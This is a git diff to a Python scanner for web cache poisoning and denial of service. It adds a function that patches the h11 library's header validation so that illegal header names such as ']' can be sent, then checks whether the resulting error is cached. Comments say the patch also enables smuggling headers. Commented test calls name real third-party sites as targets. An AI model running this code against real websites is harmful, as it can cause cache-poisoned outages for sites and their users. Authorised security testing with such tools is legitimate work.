@@ -8,6 +8,11 @@ import termcolor
 import itertools
 import concurrent.futures
 
+#used for illegal header patch
+import h11
+from h11._util import bytesify
+from h11._headers import Headers
+
 #
 # Global variables
 #
@@ -543,10 +548,57 @@ def attack_port_dos(url):
 
 #
 # Send illegal header, causes DoS
+# httpx won't allow us to execute this attack so we have
+# to patch the header validation function with our own
+# this also allows us to send invalid content-length 
+# headers and transfer-encoding, which is also useful for
+# http request smuggling/ desync attacks.
 #
+#remove validation for headers, can send illegal header names/values.
+def modified_normalize_and_validate(headers, _parsed=False):
+    new_headers = []
+    for name, value in headers:
+        name = bytesify(name)
+        value = bytesify(value)
+        raw_name = name
+        name = name.lower()
+        new_headers.append((raw_name, name, value))
+    return Headers(new_headers)
+
 def attack_illegal_header(url):
-    #TODO implement illegal header attack
-    return (False, [])
+    #patch the validation function in httpx to allow illegal headers
+    normalize_and_validate_backup = h11._headers.normalize_and_validate
+    h11._headers.normalize_and_validate = modified_normalize_and_validate
+
+    is_vulnerable = False
+    
+    #if the page does not return a 200 ok/redirect there's nothing to do
+    response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                  "accept":"*/*, text/stuff",
+                                                  "origin":"https://www.example.com"})
+    if response.status_code not in [200, 301, 302, 303, 307, 308]:
+        return (is_vulnerable, [])
+
+
+    #generate a cache buster and send the request with the header
+    cache_buster = "cache" + gen_rand_str(8)
+    response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                        "accept":"*/*, text/" + cache_buster,
+                                                                                        "origin":"https://" + cache_buster + ".example.com",
+                                                                                        "]":"x"})
+    #if we get a non 200 response code, we remove the header and resend the request
+    if response.status_code != 200:
+        time.sleep(1)
+        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                        "accept":"*/*, text/" + cache_buster,
+                                                                                        "origin":"https://" + cache_buster + ".example.com"})
+        if response.status_code != 200:
+            is_vulnerable = True
+    
+
+    #restore the validation function, god knows what I'm breaking with this little stunt
+    h11._headers.normalize_and_validate = normalize_and_validate_backup
+    return (is_vulnerable, "]")
 
 #
 # This function tries all specific attacks with console output
@@ -821,5 +873,5 @@ def assess_severity(url, headers, thread_count = 5):
 #print_banner()
 
 #test
-#specific_attacks("https://0a620006030cd19dc043437200760025.web-security-academy.net/")
+#specific_attacks("https://www.google.com/")
 #assess_severity("https://assets.finn.no/pkg/frontpage-podium/2.0.70/scripts.js", header_bruteforce("https://assets.finn.no/pkg/frontpage-podium/2.0.70/scripts.js"))
